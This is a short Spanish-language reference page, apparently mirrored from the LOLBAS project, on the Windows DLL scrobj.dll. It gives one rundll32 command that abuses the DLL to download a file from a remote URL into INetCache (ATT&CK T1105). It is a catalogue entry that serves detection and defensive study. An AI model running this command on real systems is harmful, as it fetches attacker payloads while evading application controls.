# LOLBAS: Scrobj.dll

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`

Windows Script Component Runtime

## Comandos

### Download file from remote location.

Download · priv: User · T1105

```cmd
rundll32.exe C:\Windows\System32\scrobj.dll,GenerateTypeLib {REMOTEURL:.exe}
```

Once executed, scrobj.dll attempts to load a file from the URL and saves it to INetCache.

